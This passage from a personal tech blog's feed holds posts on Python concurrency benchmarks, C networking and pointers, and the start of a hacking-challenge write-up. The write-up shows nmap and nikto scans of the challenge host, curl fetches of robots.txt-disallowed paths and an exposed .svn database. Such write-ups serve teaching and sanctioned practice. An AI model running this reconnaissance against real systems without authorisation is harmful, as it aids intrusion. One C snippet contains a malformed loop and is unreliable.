./smalisca-test.py parser --depth <span style="color:#3677a9">2</span> -l  -s java -f sqlite -o   5.50s user 0.32s system 155% cpu 3.743 total
./smalisca-test.py parser --depth <span style="color:#3677a9">2</span> -l  -s java -f sqlite -o   5.59s user 0.29s system 152% cpu 3.864 total
./smalisca-test.py parser --depth <span style="color:#3677a9">2</span> -l  -s java -f sqlite -o   5.48s user 0.40s system 155% cpu 3.794 total
./smalisca-test.py parser --depth <span style="color:#3677a9">2</span> -l  -s java -f sqlite -o   5.42s user 0.35s system 155% cpu 3.720 total
./smalisca-test.py parser --depth <span style="color:#3677a9">2</span> -l  -s java -f sqlite -o   5.79s user 0.32s system 156% cpu 3.904 total
./smalisca-test.py parser --depth <span style="color:#3677a9">2</span> -l  -s java -f sqlite -o   5.50s user 0.34s system 152% cpu 3.836 total
./smalisca-test.py parser --depth <span style="color:#3677a9">2</span> -l  -s java -f sqlite -o   5.39s user 0.35s system 150% cpu 3.824 total
./smalisca-test.py parser --depth <span style="color:#3677a9">2</span> -l  -s java -f sqlite -o   5.58s user 0.31s system 159% cpu 3.684 total
./smalisca-test.py parser --depth <span style="color:#3677a9">2</span> -l  -s java -f sqlite -o   5.44s user 0.33s system 155% cpu 3.707 total
</code></pre></div><p><strong>5.5 seconds</strong>!!! It takes <strong>longer</strong>! Obviously the <code>Queue</code> processing and starting new processes increases
execution time. Ok, now let&rsquo;s try with more <strong>jobs</strong> (=8):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ <span style="color:#24909d">export</span> <span style="color:#40ffff">CMD</span>=<span style="color:#ed9d13">&#34;time ./smalisca-test.py parser --depth 3 -j 8 -l /home/victor/work/Projects/XXX/source/smali -s java -f sqlite  -o ~/work/Projects/XXXX/db.sqlite&#34;</span>
$ <span style="color:#6ab825;font-weight:bold">for</span> i in {1..10};<span style="color:#6ab825;font-weight:bold">do</span> <span style="color:#24909d">eval</span> <span style="color:#ed9d13">${</span><span style="color:#40ffff">CMD</span><span style="color:#ed9d13">}</span> 2&gt;&amp;<span style="color:#3677a9">1</span> /dev/null | grep total; <span style="color:#6ab825;font-weight:bold">done</span>
./smalisca-test.py parser --depth <span style="color:#3677a9">3</span> -j <span style="color:#3677a9">8</span> -l  -s java -f sqlite -o   5.66s user 0.36s system 161% cpu 3.730 total
./smalisca-test.py parser --depth <span style="color:#3677a9">3</span> -j <span style="color:#3677a9">8</span> -l  -s java -f sqlite -o   5.80s user 0.29s system 161% cpu 3.761 total
./smalisca-test.py parser --depth <span style="color:#3677a9">3</span> -j <span style="color:#3677a9">8</span> -l  -s java -f sqlite -o   5.57s user 0.40s system 158% cpu 3.756 total
./smalisca-test.py parser --depth <span style="color:#3677a9">3</span> -j <span style="color:#3677a9">8</span> -l  -s java -f sqlite -o   5.49s user 0.32s system 156% cpu 3.700 total
./smalisca-test.py parser --depth <span style="color:#3677a9">3</span> -j <span style="color:#3677a9">8</span> -l  -s java -f sqlite -o   5.76s user 0.30s system 162% cpu 3.741 total
./smalisca-test.py parser --depth <span style="color:#3677a9">3</span> -j <span style="color:#3677a9">8</span> -l  -s java -f sqlite -o   5.62s user 0.28s system 162% cpu 3.641 total
./smalisca-test.py parser --depth <span style="color:#3677a9">3</span> -j <span style="color:#3677a9">8</span> -l  -s java -f sqlite -o   5.54s user 0.30s system 161% cpu 3.627 total
./smalisca-test.py parser --depth <span style="color:#3677a9">3</span> -j <span style="color:#3677a9">8</span> -l  -s java -f sqlite -o   5.63s user 0.31s system 159% cpu 3.724 total
./smalisca-test.py parser --depth <span style="color:#3677a9">3</span> -j <span style="color:#3677a9">8</span> -l  -s java -f sqlite -o   5.73s user 0.35s system 162% cpu 3.747 total
./smalisca-test.py parser --depth <span style="color:#3677a9">3</span> -j <span style="color:#3677a9">8</span> -l  -s java -f sqlite -o   5.43s user 0.34s system 153% cpu 3.764 total
</code></pre></div><p>Pretty much the <strong>same</strong> results. And here is the overall results table:</p>
<table>
<thead>
<tr>
<th>Run</th>
<th>Non-Concurrent (v0.1)</th>
<th>Concurrent (v0.1-dev)</th>
<th>Using Jobs = 8</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>3.61</td>
<td>5.52</td>
<td>5.66</td>
</tr>
<tr>
<td>2</td>
<td>3.66</td>
<td>5.50</td>
<td>5.80</td>
</tr>
<tr>
<td>3</td>
<td>3.66</td>
<td>5.59</td>
<td>5.57</td>
</tr>
<tr>
<td>4</td>
<td>3.64</td>
<td>5.48</td>
<td>5.49</td>
</tr>
<tr>
<td>5</td>
<td>3.67</td>
<td>5.42</td>
<td>5.76</td>
</tr>
<tr>
<td>6</td>
<td>3.56</td>
<td>5.79</td>
<td>5.62</td>
</tr>
<tr>
<td>7</td>
<td>3.55</td>
<td>5.50</td>
<td>5.54</td>
</tr>
<tr>
<td>8</td>
<td>3.63</td>
<td>5.39</td>
<td>5.63</td>
</tr>
<tr>
<td>9</td>
<td>3.52</td>
<td>5.38</td>
<td>5.73</td>
</tr>
<tr>
<td>10</td>
<td>3.55</td>
<td>5.44</td>
<td>5.43</td>
</tr>
</tbody>
</table>
<h2 id="lessons-learned">Lessons learned</h2>
<ul>
<li>Concurrency is <strong>NOT</strong> easy</li>
<li>It may not always have a big (positive) impact on the <strong>performance</strong> of your code</li>
<li>There are a lot of side-effects (related to concurrency in general) which you&rsquo;ll have to pay attention to</li>
<li>I need a really <strong>big</strong> code repository to test against in order to make sure I&rsquo;ve implemented it correctly</li>
<li>Despite all those kind of problems, it&rsquo;s <strong>fun</strong>! :)</li>
<li>Have a look at the <a href="https://github.com/dorneanu/smalisca/commit/a48a1b9e3eb648baf6547658e06bfe32c094551c">commit details</a> in the <a href="https://github.com/dorneanu/smalisca/tree/develop">develop</a> branch.</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="http://everydayimlearning.blogspot.de/2013/03/multiprocessing-with-python.html">Multiprocessing with Python</a></li>
<li><a href="https://moinakg.wordpress.com/2013/07/01/parallel-directory-tree-compare-in-python/">Parallel Directory Tree Compare with Python</a></li>
<li><a href="https://www.binpress.com/tutorial/simple-python-parallelism/121?utm_content=bufferc7776&amp;utm_medium=social&amp;utm_source=twitter.com&amp;utm_campaign=buffer">Simple parallelism with Python</a></li>
<li><a href="http://pymotw.com/2/multiprocessing/communication.html">Communication between processes</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>gethostbyname vs. getaddrinfo</title>
      <link>https://blog.dornea.nu/2015/04/30/gethostbyname-vs.-getaddrinfo/</link>
      <pubDate>Thu, 30 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2015/04/30/gethostbyname-vs.-getaddrinfo/</guid>
      <content:encoded><![CDATA[<p>After started coding in C <a href="http://blog.dornea.nu/2015/04/21/coming-back-to-cc-after-2-years">again</a> I&rsquo;ve had a look
at some basic network stuff like: <strong>socket()</strong>, <strong>connect()</strong> etc. In order to resolve domain names, one was used to
use <strong>gethostbyname()</strong>. I&rsquo;ve used this function in all my previous C projects but this one seems to be out-dated as
the main page states:</p>
<pre><code>The gethostbyname*(), gethostbyaddr*(), herror(), and hstrerror() functions are obsolete.  
Applications should use getaddrinfo(3), getnameinfo(3), and gai_strerror(3) instead.
</code></pre>
<p>The really bad thing about <strong>gethostbyname</strong> is the fact that it doesn&rsquo;t support IPv6. Besides that you would then load
the results into a <em>struct sockaddr_in</em>  and use it for your futher calls. A better option is <strong>getaddrinfo()</strong> which
supports IPv4 and IPv6 as well, does the DNS lookup and fills your structures. Perfect!</p>
<p>So what do you need? First you&rsquo;ll need some variables:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6ab825;font-weight:bold">int</span> status;
<span style="color:#6ab825;font-weight:bold">char</span> ip_addr[INET6_ADDRSTRLEN];
<span style="color:#6ab825;font-weight:bold">struct</span> sockaddr_in *remote;
<span style="color:#6ab825;font-weight:bold">struct</span> addrinfo hints, *res, *p;
</code></pre></div><p>And then the call:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6ab825;font-weight:bold">if</span> ((status=getaddrinfo(server_hostname, port, &amp;hints, &amp;res)) != <span style="color:#3677a9">0</span>) {
    log_err(<span style="color:#ed9d13">&#34;getaddrinfo failed: %s&#34;</span>, gai_strerror(status));
    <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
}

</code></pre></div><p><code>res</code> is a linked list which has to be looped to fetch the results:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6ab825;font-weight:bold">while</span> (p = res; p != <span style="color:#24909d">NULL</span>; p = p-&gt;ai_next) {
    <span style="color:#6ab825;font-weight:bold">void</span> *addr;
    remote = (<span style="color:#6ab825;font-weight:bold">struct</span> sockaddr_in *)p-&gt;ai_addr;
    addr = &amp;(remote-&gt;sin_addr);

    <span style="color:#999;font-style:italic">// Convert IP to string
</span><span style="color:#999;font-style:italic"></span>    inet_ntop(p-&gt;ai_family, addr, ip_addr, <span style="color:#6ab825;font-weight:bold">sizeof</span>(ip_addr));

    printf(<span style="color:#ed9d13">&#34;%s</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, ip_addr);
}
</code></pre></div><p>Now you could create your socket, connect to the host, read data and so on:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6ab825;font-weight:bold">if</span> ((socketfd = socket(res-&gt;ai_family, res-&gt;ai_socktype, res-&gt;ai_protocol)) &lt; <span style="color:#3677a9">0</span>) {
    log_err(<span style="color:#ed9d13">&#34;Failed creating socket!&#34;</span>);
    <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Coming back to C/C&#43;&#43; after 2 years</title>
      <link>https://blog.dornea.nu/2015/04/21/coming-back-to-c/c-after-2-years/</link>
      <pubDate>Tue, 21 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2015/04/21/coming-back-to-c/c-after-2-years/</guid>
      <content:encoded><![CDATA[<p>After years of <a href="http://blog.dornea.nu/tag/python/">python</a> hacking and all kind of projects (like
<a href="https://github.com/dorneanu/netgrafio">netgrafio</a> or <a href="https://github.com/dorneanu/smalisca">smalisca</a>) I wanted to do more low-level stuff and refresh my C/C++ skills. I&rsquo;ll try to describe how it feels like coming back to C/C++ after 2 years of coding abstinence.</p>
<h3 id="its-low-very-low">It&rsquo;s low.. Very low</h3>
<p>Having started a new project I didn&rsquo;t feel like I&rsquo;ve forgotten everything. It just felt strange to
<strong>declare</strong> functions and use <strong>header</strong> files. After initial difficulties I was able to run my code and compile it using <code>-Wall</code> without any warnings. Perfect.</p>
<p>The project itself is about implementing SSL/TLS in C since I&rsquo;ve never done that before. The executable
will take an <em>UR</em>L and optionally a <em>proxy</em> as arguments:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ./main -u http://blog.dornea.nu/ -p http://username:password@localhost:8080
</code></pre></div><p>The very first problem I&rsquo;ve encountered was <strong>parsing</strong>. While in Python you usually have pretty good
string operations you can apply on your string, in C you have to take of everything. In my case
I had to parse the proxy argument for its specific parts:</p>
<ul>
<li>schema</li>
<li>username</li>
<li>password</li>
<li>domain name</li>
<li>port</li>
</ul>
<p>And if that wasn&rsquo;t enought, I also have to take care about <strong>error handling</strong> in case the proxy URL is malformed.  Speaking of <em>error handling</em>: It was indeed tempted to think of some <code>try .. catch</code> construct. Naaah! I remember &hellip; The typical construct you should use:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6ab825;font-weight:bold">if</span> (not sth) {
    <span style="color:#999;font-style:italic">// this is very bad
</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">return</span> &lt;whatever&gt;
} <span style="color:#6ab825;font-weight:bold">else</span> {
    <span style="color:#999;font-style:italic">// This is was ok
</span><span style="color:#999;font-style:italic"></span>}
</code></pre></div><p>Ok. What about <strong>logging</strong>? I remember having implemented some <strong>macros</strong> in the past and finally found this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#cd2828;font-weight:bold">#define log_err(M, ...) fprintf(stderr, &#34;ERROR: \t(%s:%d: errno: %s) &#34; M &#34;\n&#34;,\     
</span><span style="color:#cd2828;font-weight:bold"></span>                       __FILE__, __LINE__, clean_errno(), <span style="color:#a61717;background-color:#e3d2d2">##</span>__VA_ARGS__) 

<span style="color:#cd2828;font-weight:bold">#define log_warn(M, ...) fprintf(stderr, &#34;WARN: \t(%s:%d: errno: %s) &#34; M &#34;\n&#34;,\
</span><span style="color:#cd2828;font-weight:bold">                        __FILE__, __LINE__, clean_errno(), ##__VA_ARGS__) 
</span></code></pre></div><p>Great! At that point if was able to pass arguments to my executable and do some string parsing.</p>
<h3 id="pointers--and-more-pointers">Pointers .. and more pointers</h3>
<p>I do know some pointers arithmetics. But coming back from <strong>objects</strong> to <strong>pointers</strong> was a big
mindset change. Almost everything is a pointer to some data structure, to some memory region etc.
Using pointers the right way has always been a challenge. Let&rsquo;s first have a look at some struct
I&rsquo;m using to collect information and store global accessible data:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6ab825;font-weight:bold">typedef</span> <span style="color:#6ab825;font-weight:bold">struct</span> globalargs {
    <span style="color:#6ab825;font-weight:bold">char</span> *prog;
    <span style="color:#6ab825;font-weight:bold">char</span> *url;
    <span style="color:#6ab825;font-weight:bold">char</span> *proxy_uri;
    <span style="color:#6ab825;font-weight:bold">int</span> port;
    <span style="color:#6ab825;font-weight:bold">int</span> verbose;
    <span style="color:#6ab825;font-weight:bold">int</span> debug;

    <span style="color:#999;font-style:italic">/* Proxy settings */</span>
    <span style="color:#6ab825;font-weight:bold">char</span> *proxy_username;
    <span style="color:#6ab825;font-weight:bold">char</span> *proxy_password;
    <span style="color:#6ab825;font-weight:bold">char</span> *proxy_host;
    <span style="color:#6ab825;font-weight:bold">int</span>  proxy_port;

} globalargs;
</code></pre></div><p>So we&rsquo;ve got pointers everywhere. I use this struct to collect the CLI arguments using <code>getopt</code>. Besides that
I&rsquo;m using <code>globalargs</code> to store information which should be available in all &ldquo;modules&rdquo; (I don&rsquo;t have any yet but
just for the explanation &hellip;). But let me explain this using some example:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold"></span>
<span style="color:#6ab825;font-weight:bold">typedef</span> <span style="color:#6ab825;font-weight:bold">struct</span> myStruct {
    <span style="color:#6ab825;font-weight:bold">char</span> *username;
    <span style="color:#6ab825;font-weight:bold">char</span> *password;
} myStruct;

<span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">change_username1</span> (<span style="color:#6ab825;font-weight:bold">char</span> *username) {
    <span style="color:#6ab825;font-weight:bold">char</span> *tmp_username = <span style="color:#ed9d13">&#34;username1&#34;</span>;
    username = tmp_username;
}

<span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">change_username2</span> (<span style="color:#6ab825;font-weight:bold">char</span> **username) {
    <span style="color:#6ab825;font-weight:bold">char</span> *tmp_username = <span style="color:#ed9d13">&#34;username2&#34;</span>;
    *username = tmp_username;
}

<span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">main</span> (<span style="color:#6ab825;font-weight:bold">int</span> argc, <span style="color:#6ab825;font-weight:bold">char</span> **argv) {
    myStruct *ms;
    <span style="color:#6ab825;font-weight:bold">char</span> *a = <span style="color:#ed9d13">&#34;username0&#34;</span>;

    <span style="color:#6ab825;font-weight:bold">if</span> (!(ms = malloc(<span style="color:#6ab825;font-weight:bold">sizeof</span>(myStruct)))) {
        printf(<span style="color:#ed9d13">&#34;Failed allocating memory!&#34;</span>);
        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
    }

    ms-&gt;username = a;
    printf(<span style="color:#ed9d13">&#34;Username: %s</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, ms-&gt;username);

    <span style="color:#999;font-style:italic">// First change
</span><span style="color:#999;font-style:italic"></span>    change_username1(ms-&gt;username);
    printf(<span style="color:#ed9d13">&#34;Username: %s</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, ms-&gt;username);

    <span style="color:#999;font-style:italic">// 2nd change
</span><span style="color:#999;font-style:italic"></span>    change_username2(&amp;ms-&gt;username);
    printf(<span style="color:#ed9d13">&#34;Username: %s</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, ms-&gt;username);

    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
}
</code></pre></div><p>When compiled and executed this produces following output:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ gcc -Wall -o n n.c &amp;&amp; ./n
Username: username0
Username: username0
Username: username2
</code></pre></div><p>As you might have noticed <code>change_usernam1</code> doesn&rsquo;t really change the <code>username</code> in the <code>myStruct</code> structure.
Using <strong>pointers to pointers</strong> I was able to make my desired change. What did I learn from this particular case?
I should definitely improve my pointer arithmetics :)</p>
<h3 id="memory-management">Memory management</h3>
<p>For almost every data structure memory has to be allocated. While this in OOP (object oriented programming) is usually done
by just creating a new instance of a new object, in C everything has to be done &ldquo;manually&rdquo;. In our example allocating memory
for <code>myStruct</code> should be easy and straight forward:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">...
    <span style="color:#6ab825;font-weight:bold">if</span> (!(ms = malloc(<span style="color:#6ab825;font-weight:bold">sizeof</span>(myStruct)))) {
        printf(<span style="color:#ed9d13">&#34;Failed allocating memory!&#34;</span>);
        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
    }
...
</code></pre></div><p>And don&rsquo;t forget to <code>free</code> your memory! That&rsquo;s it for now. Now happy (C) coding!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>usd AG Hacker challenge 2015 - Solutions</title>
      <link>https://blog.dornea.nu/2015/03/18/usd-ag-hacker-challenge-2015-solutions/</link>
      <pubDate>Wed, 18 Mar 2015 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2015/03/18/usd-ag-hacker-challenge-2015-solutions/</guid>
      <content:encoded><![CDATA[<p><a href="https://www.usd.de">usd AG</a> has announced a <a href="https://www.usd.de/usd-hackertag-2015/">hacking challenge</a> I have participated at. The target system was available at http://82.195.79.41/. Now let me sum up thg steps that have been required in order to get <strong>all</strong> 6 tokens.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;</span>
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">pandas</span> <span style="color:#6ab825;font-weight:bold">as</span> <span style="color:#447fcf;text-decoration:underline">pd</span>
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">sqlite3</span>
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">binascii</span>
</code></pre></div><h2 id="scratch-the-surface">Scratch the surface</h2>
<p>Let&rsquo;s first conduct a <strong>nmap</strong> scan to see which ports are open.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
nmap -A -T4 82.195.79.41
</code></pre></div><pre><code>Starting Nmap 6.47 ( http://nmap.org ) at 2015-03-18 20:57 CET
Nmap scan report for 82.195.79.41
Host is up (0.053s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
| http-robots.txt: 2 disallowed entries 
|_/no/one/will/ever/know/ /~freddy/
|_http-title: usd Hackertag Challenge Website
7777/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c6:62:55:12:32:5d:d9:15:bc:1e:51:77:0e:5a:96:ea (RSA)
|_  256 22:f9:96:0c:2e:99:11:17:d0:a8:89:41:40:b6:3d:58 (ECDSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds
</code></pre>
<p>So we have <strong>2 disallowed entries</strong>. Let&rsquo;s have a look:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl http://<span style="color:#3677a9">82.195.79.41</span>//no/one/will/ever/know/
</code></pre></div><pre><code>&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Index of /no/one/will/ever/know&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /no/one/will/ever/know&lt;/h1&gt;
&lt;table&gt;&lt;tr&gt;&lt;th&gt;&lt;img src=&quot;/icons/blank.gif&quot; alt=&quot;[ICO]&quot;&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=N;O=D&quot;&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=M;O=A&quot;&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=S;O=A&quot;&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=D;O=A&quot;&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/back.gif&quot; alt=&quot;[DIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;/no/one/will/ever/&quot;&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/text.gif&quot; alt=&quot;[TXT]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;secret.txt&quot;&gt;secret.txt&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;04-Mar-2015 15:23  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt; 14 &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre>
<h3 id="first-token">First token</h3>
<p>If you pay attention you&rsquo;ll see a <strong>secret.txt</strong> in that directory:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl http://<span style="color:#3677a9">82.195.79.41</span>//no/one/will/ever/know/secret.txt
</code></pre></div><pre><code>Token: 928191
</code></pre>
<p>Bingo! Ok what about <code>~freddy</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl http://<span style="color:#3677a9">82.195.79.41</span>/~freddy/
</code></pre></div><pre><code>&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Index of /~freddy&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /~freddy&lt;/h1&gt;
&lt;table&gt;&lt;tr&gt;&lt;th&gt;&lt;img src=&quot;/icons/blank.gif&quot; alt=&quot;[ICO]&quot;&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=N;O=D&quot;&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=M;O=A&quot;&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=S;O=A&quot;&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=D;O=A&quot;&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/back.gif&quot; alt=&quot;[DIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;/&quot;&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre>
<p>OK, nothing to see here. <strong>BUT</strong>: We keep in mind that <strong>freddy</strong> is probably a local username.</p>
<h2 id="2nd-token">2nd token</h2>
<p>The nmap results suggested that there is a HTTPD on port 80. Let&rsquo;s see what <strong>nikto</strong> finds:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>nikto -host http://<span style="color:#3677a9">82.195.79.41</span>/ -C <span style="color:#24909d">all</span>
</code></pre></div><pre><code>- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          82.195.79.41
+ Target Hostname:    82.195.79.41
+ Target Port:        80
+ Start Time:         2015-03-18 20:07:20 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache
+ Uncommon header 'x-frame-options' found, with contents: sameorigin
+ Server leaks inodes via ETags, header found with file /robots.txt, inode: 131873, size: 68, mtime: 0x511175d9c5600
+ OSVDB-3268: /no/one/will/ever/know/: Directory indexing found.
+ File/dir '/no/one/will/ever/know/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /~freddy/: Directory indexing found.
+ File/dir '/~freddy/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ &quot;robots.txt&quot; contains 2 entries which should be manually viewed.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3092: /.svn/entries: Subversion Entries file may contain directory listing information.
+ OSVDB-3092: /.svn/wc.db: Subversion SQLite DB file may contain directory listing information.
+ 6545 items checked: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2015-03-18 20:19:17 (GMT1) (717 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
</code></pre>
<p>Besides thet <em>robots.txt</em> entries <code>.svn</code> looks very interesting. Let&rsquo;s have a closer look:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">con = sqlite3.connect(<span style="color:#ed9d13">&#34;wc.db&#34;</span>)
